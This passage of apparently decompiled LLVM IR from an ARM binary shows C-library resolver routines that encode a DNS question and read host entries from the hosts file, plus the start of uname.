  uselistorder i32 28, { 49, 6, 8, 52, 7, 55, 56, 61, 63, 64, 9, 10, 62, 11, 12, 57, 37, 50, 51, 30, 13, 31, 14, 66, 48, 65, 15, 1, 38, 16, 17, 18, 3, 19, 53, 54, 2, 58, 59, 39, 40, 41, 42, 43, 44, 45, 0, 46, 32, 60, 33, 34, 35, 4, 5, 36, 28, 24, 23, 21, 22, 29, 25, 26, 47, 20, 27 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 4, { 2, 0, 1 }
  uselistorder i8 16, { 2, 3, 0, 4, 1, 5 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19df4 = load i32, i32* @r4, align 4
  store i32 %v3_19df4, i32* %stack_var_-16, align 4
  %v9_19df4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_19dfc = load i32, i32* %arg1, align 4
  store i32 %v2_19dfc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_19e08 = inttoptr i32 %v2_19dfc to i8*
  %v2_19e08 = call i32 @__encode_dotted(i8* %v1_19e08)
  store i32 %v2_19e08, i32* %r0.global-to-local, align 4
  %v1_19e0c = icmp slt i32 %v2_19e08, 0
  br i1 %v1_19e0c, label %dec_label_pc_19e4c, label %dec_label_pc_19e14

dec_label_pc_19e14:                               ; preds = %entry
  %v1_19e14 = load i32, i32* @r5, align 4
  %v2_19e14 = sub i32 %v1_19e14, %v2_19e08
  %v7_19e1c = icmp slt i32 %v2_19e14, 4
  br i1 %v7_19e1c, label %bb, label %dec_label_pc_19e24

bb:                                               ; preds = %dec_label_pc_19e14
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19e4c

dec_label_pc_19e24:                               ; preds = %dec_label_pc_19e14
  %v0_19e24 = load i32, i32* @r4, align 4
  %v1_19e24 = add i32 %v0_19e24, 5
  %v2_19e24 = inttoptr i32 %v1_19e24 to i8*
  %v3_19e24 = load i8, i8* %v2_19e24, align 1
  %v2_19e28 = load i32, i32* @r6, align 4
  %v4_19e28 = add i32 %v2_19e28, %v2_19e08
  %v5_19e28 = inttoptr i32 %v4_19e28 to i8*
  store i8 %v3_19e24, i8* %v5_19e28, align 1
  %v0_19e2c = load i32, i32* @r4, align 4
  %v1_19e2c = add i32 %v0_19e2c, 4
  %v2_19e2c = inttoptr i32 %v1_19e2c to i32*
  %v3_19e2c = load i32, i32* %v2_19e2c, align 4
  %v0_19e30 = load i32, i32* @r6, align 4
  %v1_19e30 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e30 = add i32 %v1_19e30, %v0_19e30
  store i32 %v2_19e30, i32* %r2.global-to-local, align 4
  %v1_19e34 = trunc i32 %v3_19e2c to i8
  %v3_19e34 = add i32 %v2_19e30, 1
  %v4_19e34 = inttoptr i32 %v3_19e34 to i8*
  store i8 %v1_19e34, i8* %v4_19e34, align 1
  %v0_19e38 = load i32, i32* @r4, align 4
  %v1_19e38 = add i32 %v0_19e38, 9
  %v2_19e38 = inttoptr i32 %v1_19e38 to i8*
  %v3_19e38 = load i8, i8* %v2_19e38, align 1
  %v2_19e3c = load i32, i32* %r2.global-to-local, align 4
  %v3_19e3c = add i32 %v2_19e3c, 2
  %v4_19e3c = inttoptr i32 %v3_19e3c to i8*
  store i8 %v3_19e38, i8* %v4_19e3c, align 1
  %v0_19e40 = load i32, i32* @r4, align 4
  %v1_19e40 = add i32 %v0_19e40, 8
  %v2_19e40 = inttoptr i32 %v1_19e40 to i32*
  %v3_19e40 = load i32, i32* %v2_19e40, align 4
  %v1_19e44 = trunc i32 %v3_19e40 to i8
  %v2_19e44 = load i32, i32* %r2.global-to-local, align 4
  %v3_19e44 = add i32 %v2_19e44, 3
  %v4_19e44 = inttoptr i32 %v3_19e44 to i8*
  store i8 %v1_19e44, i8* %v4_19e44, align 1
  %v0_19e48 = load i32, i32* %r0.global-to-local, align 4
  %v1_19e48 = add i32 %v0_19e48, 4
  store i32 %v1_19e48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19e4c

dec_label_pc_19e4c:                               ; preds = %bb, %entry, %dec_label_pc_19e24
  %v1_19e50 = phi i32 [ -1, %bb ], [ %v2_19e08, %entry ], [ %v1_19e48, %dec_label_pc_19e24 ]
  %v2_19e4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19e4c, i32* @r4, align 4
  store i32 %v9_19df4, i32* @r6, align 4
  ret i32 %v1_19e50

; uselistorder directives
  uselistorder i32 %v2_19e08, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 21, 22, 23, 26, 27, 4, 25, 20, 5, 14, 0, 15, 30, 6, 7, 13, 24, 11, 12, 16, 17, 18, 19, 8, 9, 10, 3, 2, 1, 28, 29 }
  uselistorder i32 5, { 22, 23, 24, 7, 16, 8, 25, 9, 2, 17, 10, 18, 12, 11, 3, 0, 26, 5, 19, 6, 1, 20, 21, 13, 15, 14, 4 }
  uselistorder label %dec_label_pc_19e4c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -32840), i32* @r0, align 4
  %v1_19e6c = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 -32840))
  ret i32 %v1_19e6c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_19e84 = load i32, i32* @r4, align 4
  %v6_19e84 = load i32, i32* @r5, align 4
  %v9_19e84 = load i32, i32* @r6, align 4
  %v12_19e84 = load i32, i32* @r7, align 4
  %v15_19e84 = load i32, i32* @r8, align 4
  %v18_19e84 = load i32, i32* @sb, align 4
  %v21_19e84 = load i32, i32* @sl, align 4
  %v24_19e84 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  %v2_19eac = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_19eac, align 4
  %v0_19eb0 = load i32, i32* @r0, align 4
  store i32 %v0_19eb0, i32* @r6, align 4
  %v0_19eb4 = load i32, i32* @r1, align 4
  %v0_19eb8 = load i32, i32* @r2, align 4
  store i32 %v0_19eb8, i32* @r8, align 4
  %v0_19ebc = load i32, i32* @r3, align 4
  store i32 %v0_19ebc, i32* @fp, align 4
  %v3_19ec0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19ec0, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_19ecc

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1a06c

dec_label_pc_19ecc:                               ; preds = %entry
  %v2_19ecc = icmp eq i32 %v0_19eb0, 0
  br i1 %v2_19ecc, label %dec_label_pc_19ed4, label %dec_label_pc_19ef4

dec_label_pc_19ed4:                               ; preds = %dec_label_pc_19ecc
  %v0_19ed4 = call i32 @__open_etc_hosts()
  store i32 %v0_19ed4, i32* @r6, align 4
  %v2_19ed8 = icmp eq i32 %v0_19ed4, 0
  br i1 %v2_19ed8, label %dec_label_pc_19ee0, label %dec_label_pc_19ef4

dec_label_pc_19ee0:                               ; preds = %dec_label_pc_19ed4
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_19ee4 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_19ee4, align 4
  %v0_19ee8 = call i32 @__GI___errno_location()
  %v1_19eec = inttoptr i32 %v0_19ee8 to i32*
  %v2_19eec = load i32, i32* %v1_19eec, align 4
  store i32 %v2_19eec, i32* @sb, align 4
  br label %dec_label_pc_1a06c

dec_label_pc_19ef4:                               ; preds = %dec_label_pc_19ed4, %dec_label_pc_19ecc
  %v1_19f14 = phi i32 [ %v0_19ed4, %dec_label_pc_19ed4 ], [ %v0_19eb0, %dec_label_pc_19ecc ]
  %v0_19ef8 = load i32, i32* @r4, align 4
  %v2_19ef8 = add i32 %v0_19ef8, -32828
  store i32 %v2_19ef8, i32* @r4, align 4
  %v2_19efc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_19f14 = add i32 %v1_19f14, 8
  %v3_19f14 = inttoptr i32 %v2_19f14 to i32*
  store i32 48, i32* %v3_19f14, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_19f1c = load i32, i32* @r5, align 4
  %v1_19f1c = add i32 %v0_19f1c, -48
  store i32 %v1_19f1c, i32* %r1.global-to-local, align 4
  %v0_19f20 = load i32, i32* %ip.global-to-local, align 4
  %v1_19f20 = add i32 %v0_19f20, 24
  store i32 %v1_19f20, i32* @ip, align 4
  %v0_19f24 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19f24, i32* @sb, align 4
  %v0_19f28 = load i32, i32* @lr, align 4
  %v1_19f28 = add i32 %v0_19f28, 32
  store i32 %v1_19f28, i32* @sl, align 4
  %v1_19f2c = load i32, i32* @r6, align 4
  %v2_19f2c = add i32 %v1_19f2c, 16
  %v3_19f2c = inttoptr i32 %v2_19f2c to i32*
  store i32 %v1_19f1c, i32* %v3_19f2c, align 4
  %v0_19f30 = load i32, i32* @r4, align 4
  %v0_19f34 = load i32, i32* @ip, align 4
  store i32 %v0_19f34, i32* %stack_var_-64, align 4
  %v0_19f38 = load i32, i32* %r2.global-to-local, align 4
  %v1_19f38 = load i32, i32* %r3.global-to-local, align 4
  %v2_19f38 = inttoptr i32 %v1_19f38 to i32*
  store i32 %v0_19f38, i32* %v2_19f38, align 4
  %v0_19f3c = load i32, i32* @lr, align 4
  %v1_19f3c = load i32, i32* @r6, align 4
  %v2_19f3c = add i32 %v1_19f3c, 4
  %v3_19f3c = inttoptr i32 %v2_19f3c to i32*
  store i32 %v0_19f3c, i32* %v3_19f3c, align 4
  %v2_19f6c = inttoptr i32 %v0_19eb4 to i8*
  br label %dec_label_pc_1a040

dec_label_pc_19f44:                               ; preds = %dec_label_pc_1a040
  %v3_19f44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19f44, i32* %r1.global-to-local, align 4
  %v0_19f48 = load i32, i32* @fp, align 4
  %v7_19f48 = icmp eq i32 %v0_19f48, 1
  %v1_19f4c = add i32 %v3_19f44, 4
  store i32 %v1_19f4c, i32* @r5, align 4
  %v1_19f50 = load i32, i32* @r7, align 4
  %v2_19f50 = add i32 %v1_19f50, 4
  %v3_19f50 = inttoptr i32 %v2_19f50 to i32*
  store i32 %v1_19f4c, i32* %v3_19f50, align 4
  br i1 %v7_19f48, label %dec_label_pc_1a06c, label %dec_label_pc_19f58

dec_label_pc_19f58:                               ; preds = %dec_label_pc_19f44
  %v0_19f58 = load i32, i32* @fp, align 4
  %v7_19f58 = icmp eq i32 %v0_19f58, 2
  br i1 %v7_19f58, label %dec_label_pc_19f64, label %dec_label_pc_19f88.preheader

dec_label_pc_19f88.preheader:                     ; preds = %dec_label_pc_19f58
  %v1_19f5c = load i32, i32* @r5, align 4
  %v1_19f8825 = inttoptr i32 %v1_19f5c to i32*
  %v2_19f8826 = load i32, i32* %v1_19f8825, align 4
  store i32 %v2_19f8826, i32* %r3.global-to-local, align 4
  store i32 %v2_19f8826, i32* %r1.global-to-local, align 4
  %v2_19f8c28 = icmp eq i32 %v2_19f8826, 0
  %v1_19f9429 = add i32 %v1_19f5c, 4
  store i32 %v1_19f9429, i32* @r4, align 4
  br i1 %v2_19f8c28, label %dec_label_pc_1a040, label %dec_label_pc_19f7c

dec_label_pc_19f64:                               ; preds = %dec_label_pc_19f58
  %v0_19f64 = load i32, i32* %r1.global-to-local, align 4
  %v1_19f64 = inttoptr i32 %v0_19f64 to i32*
  %v2_19f64 = load i32, i32* %v1_19f64, align 4
  store i32 %v2_19f64, i32* @r1, align 4
  %v3_19f6c = call i32 @__GI_strcoll(i8* %v2_19f6c, i32 %v2_19f64)
  %v2_19f70 = icmp eq i32 %v3_19f6c, 0
  br i1 %v2_19f70, label %dec_label_pc_19fa0, label %dec_label_pc_1a040

dec_label_pc_19f7c:                               ; preds = %dec_label_pc_19f88.preheader, %dec_label_pc_19f7c.dec_label_pc_19f88_crit_edge
  %v2_19f8830 = phi i32 [ %v2_19f88, %dec_label_pc_19f7c.dec_label_pc_19f88_crit_edge ], [ %v2_19f8826, %dec_label_pc_19f88.preheader ]
  %v3_19f7c = call i32 @__GI_strcasecmp(i8* %v2_19f6c, i32 %v2_19f8830)
  %v2_19f80 = icmp eq i32 %v3_19f7c, 0
  br i1 %v2_19f80, label %dec_label_pc_19fa0, label %dec_label_pc_19f7c.dec_label_pc_19f88_crit_edge

dec_label_pc_19f7c.dec_label_pc_19f88_crit_edge:  ; preds = %dec_label_pc_19f7c
  %v0_19f88.pre = load i32, i32* @r4, align 4
  %v1_19f88 = inttoptr i32 %v0_19f88.pre to i32*
  %v2_19f88 = load i32, i32* %v1_19f88, align 4
  store i32 %v2_19f88, i32* %r3.global-to-local, align 4
  store i32 %v2_19f88, i32* %r1.global-to-local, align 4
  %v2_19f8c = icmp eq i32 %v2_19f88, 0
  %v1_19f94 = add i32 %v0_19f88.pre, 4
  store i32 %v1_19f94, i32* @r4, align 4
  br i1 %v2_19f8c, label %dec_label_pc_1a040, label %dec_label_pc_19f7c

dec_label_pc_19fa0:                               ; preds = %dec_label_pc_19f7c, %dec_label_pc_19f64
  %v0_19fa0 = load i32, i32* @r5, align 4
  %v1_19fa0 = inttoptr i32 %v0_19fa0 to i32*
  %v2_19fa0 = load i32, i32* %v1_19fa0, align 4
  store i32 %v2_19fa0, i32* %r3.global-to-local, align 4
  %v4_19fa0 = add i32 %v0_19fa0, 4
  store i32 %v4_19fa0, i32* @r5, align 4
  %v2_19fa4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_19fa4, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_19fac = load i32, i32* @r7, align 4
  %v2_19fac = inttoptr i32 %v1_19fac to i32*
  store i32 %v2_19fa0, i32* %v2_19fac, align 4
  %v0_19fb0 = load i32, i32* @lr, align 4
  %v1_19fb0 = load i32, i32* @ip, align 4
  %v2_19fb0 = add i32 %v1_19fb0, 4
  %v3_19fb0 = inttoptr i32 %v2_19fb0 to i32*
  store i32 %v0_19fb0, i32* %v3_19fb0, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_19fb8 = load i32, i32* @r8, align 4
  %v7_19fb8 = icmp eq i32 %v0_19fb8, 2
  %v0_19fbc = load i32, i32* @r5, align 4
  %v1_19fbc = load i32, i32* @r7, align 4
  %v2_19fbc = add i32 %v1_19fbc, 4
  %v3_19fbc = inttoptr i32 %v2_19fbc to i32*
  store i32 %v0_19fbc, i32* %v3_19fbc, align 4
  %v0_19fc0 = load i32, i32* @ip, align 4
  %v1_19fc0 = load i32, i32* @r7, align 4
  %v2_19fc0 = add i32 %v1_19fc0, 16
  %v3_19fc0 = inttoptr i32 %v2_19fc0 to i32*
  store i32 %v0_19fc0, i32* %v3_19fc0, align 4
  %v0_19fc4 = load i32, i32* @sl, align 4
  %v1_19fc4 = load i32, i32* %r2.global-to-local, align 4
  %v2_19fc4 = add i32 %v1_19fc4, 24
  %v3_19fc4 = inttoptr i32 %v2_19fc4 to i32*
  store i32 %v0_19fc4, i32* %v3_19fc4, align 4
  br i1 %v7_19fb8, label %dec_label_pc_19fcc, label %dec_label_pc_19ffc

dec_label_pc_19fcc:                               ; preds = %dec_label_pc_19fa0
  %v3_19fcc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_19fcc, i32* %r3.global-to-local, align 4
  %v0_19fd0 = load i32, i32* @r8, align 4
  %v1_19fd4 = inttoptr i32 %v3_19fcc to i32*
  %v2_19fd4 = load i32, i32* %v1_19fd4, align 4
  store i32 %v2_19fd4, i32* %r1.global-to-local, align 4
  %v0_19fd8 = load i32, i32* @sl, align 4
  store i32 %v0_19fd8, i32* %r2.global-to-local, align 4
  %v3_19fdc = inttoptr i32 %v2_19fd4 to i8*
  %v4_19fdc = call i32 @inet_pton(i32 %v0_19fd0, i8* %v3_19fdc, i32 %v0_19fd8)
  %tmp23 = icmp slt i32 %v4_19fdc, 1
  br i1 %tmp23, label %dec_label_pc_1a03c, label %dec_label_pc_19fe8

dec_label_pc_19fe8:                               ; preds = %dec_label_pc_19fcc
  %v0_19fec = load i32, i32* @r7, align 4
  %v2_19fec = inttoptr i32 %tmp7 to i32*
  store i32 %v0_19fec, i32* %v2_19fec, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_19ff4 = load i32, i32* @r8, align 4
  %v1_19ff4 = load i32, i32* @r7, align 4
  %v2_19ff4 = add i32 %v1_19ff4, 8
  %v3_19ff4 = inttoptr i32 %v2_19ff4 to i32*
  store i32 %v0_19ff4, i32* %v3_19ff4, align 4
  %v0_1a034.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a030

dec_label_pc_19ffc:                               ; preds = %dec_label_pc_19fa0
  %v0_19ffc = load i32, i32* @r8, align 4
  %v7_19ffc = icmp eq i32 %v0_19ffc, 10
  br i1 %v7_19ffc, label %dec_label_pc_1a004, label %dec_label_pc_1a03c

dec_label_pc_1a004:                               ; preds = %dec_label_pc_19ffc
  %v3_1a004 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1a004, i32* %r3.global-to-local, align 4
  %v1_1a00c = inttoptr i32 %v3_1a004 to i32*
  %v2_1a00c = load i32, i32* %v1_1a00c, align 4
  store i32 %v2_1a00c, i32* %r1.global-to-local, align 4
  %v0_1a010 = load i32, i32* @sl, align 4
  store i32 %v0_1a010, i32* %r2.global-to-local, align 4
  %v3_1a014 = inttoptr i32 %v2_1a00c to i8*
  %v4_1a014 = call i32 @inet_pton(i32 10, i8* %v3_1a014, i32 %v0_1a010)
  %tmp24 = icmp slt i32 %v4_1a014, 1
  br i1 %tmp24, label %dec_label_pc_1a03c, label %dec_label_pc_1a020

dec_label_pc_1a020:                               ; preds = %dec_label_pc_1a004
  store i32 %tmp7, i32* @ip, align 4
  %v0_1a024 = load i32, i32* @r8, align 4
  %v1_1a024 = load i32, i32* @r7, align 4
  %v2_1a024 = add i32 %v1_1a024, 8
  %v3_1a024 = inttoptr i32 %v2_1a024 to i32*
  store i32 %v0_1a024, i32* %v3_1a024, align 4
  %v0_1a028 = load i32, i32* @r7, align 4
  %v1_1a028 = load i32, i32* @ip, align 4
  %v2_1a028 = inttoptr i32 %v1_1a028 to i32*
  store i32 %v0_1a028, i32* %v2_1a028, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a030

dec_label_pc_1a030:                               ; preds = %dec_label_pc_19fe8, %dec_label_pc_1a020
  %v0_1a034 = phi i32 [ %v0_1a034.pre, %dec_label_pc_19fe8 ], [ 16, %dec_label_pc_1a020 ]
  store i32 0, i32* @sb, align 4
  %v1_1a034 = load i32, i32* @r7, align 4
  %v2_1a034 = add i32 %v1_1a034, 12
  %v3_1a034 = inttoptr i32 %v2_1a034 to i32*
  store i32 %v0_1a034, i32* %v3_1a034, align 4
  br label %dec_label_pc_1a064

dec_label_pc_1a03c:                               ; preds = %dec_label_pc_19ffc, %dec_label_pc_1a004, %dec_label_pc_19fcc
  store i32 2, i32* @sb, align 4
  br label %dec_label_pc_1a040

dec_label_pc_1a040:                               ; preds = %dec_label_pc_19f88.preheader, %dec_label_pc_19f7c.dec_label_pc_19f88_crit_edge, %dec_label_pc_19f64, %dec_label_pc_1a03c, %dec_label_pc_19ef4
  %v0_1a040 = load i32, i32* @r6, align 4
  store i32 %v2_19efc, i32* %r1.global-to-local, align 4
  store i32 459270, i32* %r2.global-to-local, align 4
  store i32 %v0_19f30, i32* %r3.global-to-local, align 4
  %v4_1a050 = inttoptr i32 %v0_1a040 to i32*
  %v5_1a050 = call i32 @__GI_config_read(i32* %v4_1a050, i32 %v2_19efc, i32 459270, i32 %v0_19f30)
  %v2_1a054 = icmp eq i32 %v5_1a050, 0
  br i1 %v2_1a054, label %dec_label_pc_1a05c, label %dec_label_pc_19f44

dec_label_pc_1a05c:                               ; preds = %dec_label_pc_1a040
  %v0_1a05c = load i32, i32* @fp, align 4
  %v7_1a05c = icmp eq i32 %v0_1a05c, 1
  br i1 %v7_1a05c, label %dec_label_pc_1a06c, label %dec_label_pc_1a064

dec_label_pc_1a064:                               ; preds = %dec_label_pc_1a05c, %dec_label_pc_1a030
  %v0_1a064 = load i32, i32* @r6, align 4
  %v1_1a068 = inttoptr i32 %v0_1a064 to i32*
  %v2_1a068 = call i32 @__GI_config_close(i32* %v1_1a068)
  br label %dec_label_pc_1a06c

dec_label_pc_1a06c:                               ; preds = %dec_label_pc_19f44, %.thread, %dec_label_pc_1a05c, %dec_label_pc_19ee0, %dec_label_pc_1a064
  %v0_1a06c = load i32, i32* @sb, align 4
  store i32 %v3_19e84, i32* @r4, align 4
  store i32 %v6_19e84, i32* @r5, align 4
  store i32 %v9_19e84, i32* @r6, align 4
  store i32 %v12_19e84, i32* @r7, align 4
  store i32 %v15_19e84, i32* @r8, align 4
  store i32 %v18_19e84, i32* @sb, align 4
  store i32 %v21_19e84, i32* @sl, align 4
  store i32 %v24_19e84, i32* @fp, align 4
  ret i32 %v0_1a06c

; uselistorder directives
  uselistorder i32 %v2_19f88, { 1, 2, 3, 0 }
  uselistorder i32 %v0_19f88.pre, { 1, 0 }
  uselistorder i32 %v0_19f30, { 1, 0 }
  uselistorder i32 %v2_19efc, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 3, 2, 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 10, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 5, 6, 7, 8 }
  uselistorder i32* %r1.global-to-local, { 5, 0, 1, 2, 3, 7, 4, 6 }
  uselistorder i32 (i32*)* @__GI_config_close, { 1, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_config_read, { 2, 0, 1 }
  uselistorder i32 10, { 3, 37, 39, 40, 10, 44, 47, 48, 49, 28, 29, 12, 11, 4, 51, 50, 41, 13, 52, 14, 53, 15, 54, 55, 1, 32, 16, 33, 17, 18, 19, 38, 8, 0, 42, 43, 20, 57, 45, 46, 34, 35, 21, 36, 22, 9, 30, 31, 7, 6, 2, 56, 23, 5, 25, 26, 24, 27, 58 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 18, 19, 20, 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 24, { 64, 68, 70, 71, 0, 82, 13, 18, 1, 54, 72, 73, 41, 42, 43, 44, 19, 69, 83, 2, 76, 77, 78, 20, 65, 66, 55, 21, 67, 22, 45, 46, 23, 47, 24, 25, 26, 3, 27, 28, 29, 30, 74, 75, 14, 31, 4, 79, 32, 33, 34, 36, 35, 37, 5, 6, 7, 56, 57, 58, 59, 60, 61, 62, 63, 48, 80, 38, 81, 39, 49, 50, 51, 52, 53, 15, 16, 40, 10, 9, 17, 8, 11, 12, 84 }
  uselistorder i32 -48, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 48, { 5, 38, 24, 6, 35, 36, 25, 26, 27, 28, 0, 1, 30, 7, 31, 32, 2, 8, 33, 9, 39, 10, 40, 41, 42, 11, 13, 12, 14, 37, 3, 15, 34, 16, 18, 29, 17, 19, 20, 21, 22, 23, 4 }
  uselistorder i32 34, { 7, 8, 9, 10, 2, 3, 0, 5, 11, 4, 12, 6, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_268d4.582 to i32), { 95, 67, 68, 69, 96, 3, 4, 70, 97, 1, 98, 99, 100, 101, 102, 103, 71, 72, 104, 105, 26, 106, 9, 11, 6, 7, 10, 5, 8, 107, 12, 73, 108, 109, 110, 13, 74, 111, 112, 14, 15, 113, 16, 114, 17, 115, 18, 116, 75, 117, 76, 118, 19, 20, 119, 77, 120, 121, 122, 123, 124, 125, 36, 35, 37, 126, 27, 61, 57, 55, 54, 56, 58, 59, 60, 53, 62, 48, 50, 49, 47, 46, 51, 52, 43, 42, 45, 44, 41, 40, 39, 38, 79, 63, 78, 64, 65, 80, 127, 2, 82, 81, 83, 21, 128, 22, 84, 85, 129, 87, 130, 131, 132, 133, 23, 134, 89, 88, 34, 31, 32, 33, 30, 24, 66, 29, 86, 90, 135, 91, 136, 25, 137, 138, 28, 139, 92, 140, 0, 93, 94 }
  uselistorder i32* @fp, { 37, 38, 39, 40, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0, 63, 73, 74, 75, 76, 77, 78, 79, 80, 81, 5, 6, 82, 83, 1, 84, 85, 86, 87, 41, 42, 43, 44, 45, 46, 47, 48, 2, 59, 60, 61, 62, 133, 135, 134, 136, 117, 118, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 64, 65, 66, 67, 68, 69, 70, 71, 72, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 31, 32, 33, 34, 35, 36, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 137, 138, 139, 140, 141, 142, 143, 150, 151, 149, 144, 145, 146, 147, 148, 4 }
  uselistorder i32* @sl, { 30, 31, 32, 33, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 56, 57, 58, 59, 0, 60, 1, 61, 62, 63, 64, 65, 66, 67, 68, 69, 9, 10, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 34, 35, 36, 37, 38, 6, 7, 11, 12, 49, 50, 51, 52, 53, 54, 84, 85, 86, 2, 87, 88, 89, 90, 91, 92, 94, 3, 93, 96, 95, 97, 98, 99, 100, 80, 81, 82, 83, 13, 14, 15, 16, 17, 18, 19, 4, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 5, 8 }
  uselistorder i32* @sb, { 17, 18, 19, 20, 25, 26, 27, 28, 29, 30, 43, 31, 32, 33, 2, 34, 71, 72, 3, 73, 74, 75, 76, 77, 78, 79, 6, 7, 8, 80, 81, 82, 83, 84, 85, 86, 21, 22, 23, 24, 35, 36, 37, 38, 39, 40, 41, 42, 89, 92, 90, 91, 93, 87, 88, 9, 10, 11, 12, 13, 14, 15, 0, 16, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 1, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 5 }
  uselistorder i32* @r8, { 41, 42, 43, 44, 45, 46, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 70, 73, 7, 74, 75, 76, 77, 78, 3, 79, 80, 81, 82, 83, 84, 18, 19, 20, 85, 86, 87, 88, 89, 90, 91, 92, 93, 47, 48, 49, 50, 21, 22, 23, 12, 13, 4, 14, 8, 9, 10, 11, 65, 66, 5, 67, 68, 69, 96, 97, 98, 99, 100, 6, 101, 102, 103, 104, 105, 106, 107, 108, 94, 95, 71, 72, 24, 25, 0, 26, 31, 32, 33, 34, 35, 36, 2, 37, 1, 38, 39, 40, 15, 16, 62, 63, 27, 28, 29, 30, 17 }
  uselistorder label %dec_label_pc_1a06c, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1a040, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_1a03c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a030, { 1, 0 }
  uselistorder label %dec_label_pc_19f7c, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1a088 = load i32, i32* @r7, align 4
